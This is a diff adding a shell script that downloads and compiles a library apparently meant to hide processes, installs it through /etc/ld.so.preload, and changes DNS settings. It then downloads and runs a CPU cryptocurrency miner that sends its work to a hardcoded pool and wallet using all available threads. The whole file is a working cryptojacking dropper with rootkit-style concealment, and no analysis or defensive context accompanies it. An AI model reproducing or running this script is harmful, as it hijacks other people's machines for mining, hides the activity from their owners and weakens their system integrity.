@@ -1,0 +1,15 @@
+#!/bin/sh
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+apt install curl libssl1.0-dev
+apt install libjansson-dev libjansson4 -y
+curl https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+curl https://gitlab.com/Tritonn204/tnn-miner/-/releases/v0.6.6/downloads/Tnn-miner-amd64-v0.6.6.tar.gz -L -o Tnn-miner-amd64-v0.6.6.tar.gz
+tar xf Tnn-miner-amd64-v0.6.6.tar.gz
+./tnn-miner-cpu --xel --daemon-address de.xelis.herominers.com:1225 --worker-name $(shuf -n 1 -i 1-999)-BISMI --wallet xel:nc9cm9ps6asjenezcjx8ynjwg8zvc77t5xg3djjw2ke33lxxqvtqq6p39r8 --threads $(nproc --all)
